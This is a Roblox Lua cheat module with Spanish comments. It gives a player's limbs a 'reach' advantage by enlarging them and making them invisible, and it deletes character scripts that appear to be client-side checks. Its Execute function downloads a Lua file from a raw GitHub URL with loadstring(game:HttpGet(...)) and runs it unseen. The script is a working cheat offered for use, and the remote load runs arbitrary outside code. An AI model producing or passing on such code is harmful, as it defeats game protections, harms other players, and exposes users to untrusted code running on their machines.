local module = {}

local Players = game:GetService("Players")

local function getCharacter()
    local player = Players.LocalPlayer
    return player.Character or player.CharacterAdded:Wait()
end

-- CLONAR PIERNAS
local function cloneLimb(character, limbName)
    local limb = character:FindFirstChild(limbName)
    if limb then
        local limbCopy = limb:Clone()
        limbCopy.Parent = limb.Parent
        limbCopy.Anchored = true

        local weldConstraint = Instance.new("WeldConstraint")
        weldConstraint.Part0 = limbCopy
        weldConstraint.Part1 = limb
        weldConstraint.Parent = limbCopy

        task.wait(0.1)
        limbCopy.Anchored = false
    end
end

-- 🔹 APLICAR REACH
function module:Apply()
    local character = getCharacter()

    if self.Reach ~= true then
        return
    end

    if self.Armreach == true then
        character["Right Arm"].Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)
        character["Left Arm"].Size = Vector3.new(self.ArmreachMultiplier, self.ArmreachMultiplier, self.ArmreachMultiplier)

        character["Right Arm"].Transparency = self.ReachOpacity
        character["Left Arm"].Transparency = self.ReachOpacity

        character["Right Arm"].Massless = true
        character["Left Arm"].Massless = true
    end

    if self.Legreach == true then
        character["Right Leg"].Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)
        character["Left Leg"].Size = Vector3.new(self.LegreachMultiplier, 2, self.LegreachMultiplier)

        character["Right Leg"].Transparency = self.ReachOpacity
        character["Left Leg"].Transparency = self.ReachOpacity

        character["Right Leg"].Massless = true
        character["Left Leg"].Massless = true
    end
end

-- 🔹 RESET
function module:Reset()
    local character = getCharacter()

    local function resetLimb(name)
        local limb = character:FindFirstChild(name)
        if limb then
            limb.Size = Vector3.new(1,2,1)
            limb.Transparency = 0
            limb.Massless = true
        end
    end

    resetLimb("Right Arm")
    resetLimb("Left Arm")
    resetLimb("Right Leg")
    resetLimb("Left Leg")
end

-- 🔹 EJECUTAR TODO
function module:Execute()

    local character = getCharacter()

    -- Clonar piernas
    cloneLimb(character, "Right Leg")
    cloneLimb(character, "Left Leg")

    -- Seguridad
    if not workspace:FindFirstChild("Configuration") then
        return
    end

    if character:FindFirstChild("ClientRemotesFire") then
        character.ClientRemotesFire:Destroy()
    end

    task.wait(1)

    if character:FindFirstChild("LocalScript") then
        character.LocalScript:Destroy()
    end

    -- Load externo
    loadstring(game:HttpGet('https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua'))()

    -- Aplicar reach con variables actuales
    self:Apply()
end

------------------------------------------------------------------
-- ⚙️ CONFIGURACIÓN (EDITAR ABAJO)
------------------------------------------------------------------

module.Reach = true
module.ReachOpacity = 1

module.Legreach = true
module.LegreachMultiplier = 2.4

module.Armreach = false
module.ArmreachMultiplier = 52

module.Trollclear = false

------------------------------------------------------------------

return module
